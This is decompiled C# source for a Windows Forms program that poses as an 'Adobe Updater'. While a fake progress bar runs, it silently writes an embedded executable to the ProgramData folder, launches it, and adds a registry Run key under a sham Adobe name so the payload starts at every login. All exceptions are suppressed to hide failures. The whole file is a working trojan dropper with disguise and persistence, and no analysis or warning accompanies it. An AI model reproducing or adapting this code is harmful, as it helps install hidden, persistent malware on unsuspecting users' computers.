using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace WindowsFormsApplication5;

public class Form1 : Form
{
	private IContainer components = null;

	public static string programDirectory = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);

	public static string projectName = "AdobeUpdater_v01";

	public static string sourcePath = Application.get_ExecutablePath();

	private ProgressBar progressBar1;

	private Label label2;

	private Label label1;

	public Form1()
	{
		try
		{
			_ = programDirectory + "\\" + projectName + ".exe";
			InitializeComponent();
			SaveLibrary();
			string value = programDirectory + "\\AdobeUpdater_v01.exe";
			Registry.CurrentUser.OpenSubKey("SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", writable: true)!.SetValue("Adobe Updater v01", value);
			Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("Adobe Updater v01", value);
		}
		catch (Exception)
		{
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void process_ac(object sender, EventArgs e)
	{
		progressBar1.set_Value(0);
		for (int i = 0; i < 100; i++)
		{
			progressBar1.set_Value(i);
			Thread.Sleep(i);
		}
		((Control)label1).set_Visible(false);
		((Control)label2).set_Visible(true);
		((Control)progressBar1).set_Visible(false);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		progressBar1 = new ProgressBar();
		label2 = new Label();
		label1 = new Label();
		((Control)this).SuspendLayout();
		componentResourceManager.ApplyResources(progressBar1, "progressBar1");
		((Control)progressBar1).set_Name("progressBar1");
		progressBar1.set_Step(0);
		componentResourceManager.ApplyResources(label2, "label2");
		((Control)label2).set_Name("label2");
		((Control)label2).add_Click((EventHandler)label2_Click);
		componentResourceManager.ApplyResources(label1, "label1");
		((Control)label1).set_Name("label1");
		componentResourceManager.ApplyResources(this, "$this");
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)progressBar1);
		((Control)this).set_ForeColor(SystemColors.MenuHighlight);
		((Form)this).set_FormBorderStyle((FormBorderStyle)2);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).add_Shown((EventHandler)process_ac);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public void SaveLibrary()
	{
		try
		{
			using (Stream stream = ((object)this).GetType().Assembly.GetManifestResourceStream(projectName + ".exe"))
			{
				byte[] array = new byte[stream.Length];
				stream.Read(array, 0, array.Length);
				using Stream stream2 = new FileStream(programDirectory + "\\" + projectName + ".exe", FileMode.Create);
				stream2.Write(array, 0, array.Length);
			}
			Process.Start(programDirectory + "\\" + projectName + ".exe");
		}
		catch (Exception)
		{
		}
	}

	private void linkLabel1_LinkClicked_1(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("http://www.facebook.com");
	}

	private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("http://www.youtube.com");
	}

	private void label2_Click(object sender, EventArgs e)
	{
	}
}
